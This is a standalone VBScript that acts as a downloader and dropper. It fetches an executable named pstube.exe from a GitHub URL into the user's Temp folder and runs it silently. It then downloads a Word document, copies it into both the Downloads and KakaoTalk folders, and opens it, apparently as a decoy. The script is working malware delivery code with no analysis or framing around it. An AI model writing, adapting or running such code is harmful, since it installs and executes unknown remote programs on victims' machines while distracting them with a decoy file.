Set WshShell = CreateObject("Wscript.Shell")

TempPath = WshShell.ExpandEnvironmentStrings("%localappdata%\Temp")

strLink1 = "https://github.com/choitaewon649/save/raw/main/pstube.exe"
strLink2 = "https://github.com/choitaewon649/save/raw/main/1235.docx"

DownloadPath = WshShell.ExpandEnvironmentStrings("%userprofile%") & "\Downloads"
KatalkPath = WshShell.ExpandEnvironmentStrings("%localappdata%\Kakao\KakaoTalk")

Set objFSO = CreateObject("Scripting.FileSystemObject")

   strSaveName1 = Mid(strLink1, InStrRev(strLink1,"/") + 1, Len(strLink1))
   strSaveTo1 = TempPath & "\" & strSaveName1


   strSaveName2 = Mid(strLink2, InStrRev(strLink2,"/") + 1, Len(strLink2))
   strSaveTo2 = DownloadPath & "\" & strSaveName2
   strSaveTo3 = KatalkPath & "\" & strSaveName2
   
If objFSO.FileExists(strSaveTo2) = 0 Then
   'WScript.Echo "HTTPDownload"
   'WScript.Echo "-------------"
   'WScript.Echo "Download: " & strLink1
   'WScript.Echo "Save to:  " & strSaveTo1
 
     ' Create an HTTP object
     Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
 
     ' Download the specified URL
     objHTTP.Open "GET", strLink1, False
     ' Use HTTPREQUEST_SETCREDENTIALS_FOR_PROXY if user and password is for proxy, not for download the file.
     ' objHTTP.SetCredentials "User", "Password", HTTPREQUEST_SETCREDENTIALS_FOR_SERVER
     objHTTP.Send
     
   'Set objFSO = CreateObject("Scripting.FileSystemObject")
   'If objFSO.FileExists(strSaveTo1) Then
    'objFSO.DeleteFile(strSaveTo1)
   'End If
 
      If objHTTP.Status = 200 Then
     Dim objStream
     Set objStream = CreateObject("ADODB.Stream")
     With objStream
      .Type = 1 'adTypeBinary
      .Open
      .Write objHTTP.ResponseBody
      .SaveToFile strSaveTo1
      .Close
     End With
     set objStream = Nothing
   End If
   
   If objFSO.FileExists(strSaveTo1) Then
    WScript.Echo "Download `" & strSaveName1 & "` completed successfuly."
   End If 

  Set oExec = WshShell.Exec(strSaveTo1)



   
   'WScript.Echo "HTTPDownload"
   'WScript.Echo "-------------"
   'WScript.Echo "Download: " & strLink2
   'WScript.Echo "Save to:  " & strSaveTo2


     ' Create an HTTP object
     'Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
 
     ' Download the specified URL
     objHTTP.Open "GET", strLink2, False
     ' Use HTTPREQUEST_SETCREDENTIALS_FOR_PROXY if user and password is for proxy, not for download the file.
     ' objHTTP.SetCredentials "User", "Password", HTTPREQUEST_SETCREDENTIALS_FOR_SERVER
     objHTTP.Send
     
   'Set objFSO = CreateObject("Scripting.FileSystemObject")
   If objFSO.FileExists(strSaveTo2) Then
    objFSO.DeleteFile(strSaveTo2)
   End If
 
      If objHTTP.Status = 200 Then
     'Dim objStream
     Set objStream = CreateObject("ADODB.Stream")
     With objStream
      .Type = 1 'adTypeBinary
      .Open
      .Write objHTTP.ResponseBody
      .SaveToFile strSaveTo2
      .SaveToFile strSaveTo3
      .Close
     End With
     set objStream = Nothing
   End If
   
   'If objFSO.FileExists(strSaveTo2) Then
    'WScript.Echo "Download `" & strSaveName2 & "` completed successfuly."
   'End If 

  Dim quote, pgms

  'set shell = WScript.CreateObject("WScript.Shell")
  quote = Chr(34)
  pgm = "WINWORD"
  WshShell.Run quote & pgm & quote & " " & strSaveTo2

End If

If objFSO.FileExists(strSaveTo2) Then
  quote = Chr(34)
  pgm = "WINWORD"
  WshShell.Run quote & pgm & quote & " " & strSaveTo2
End If
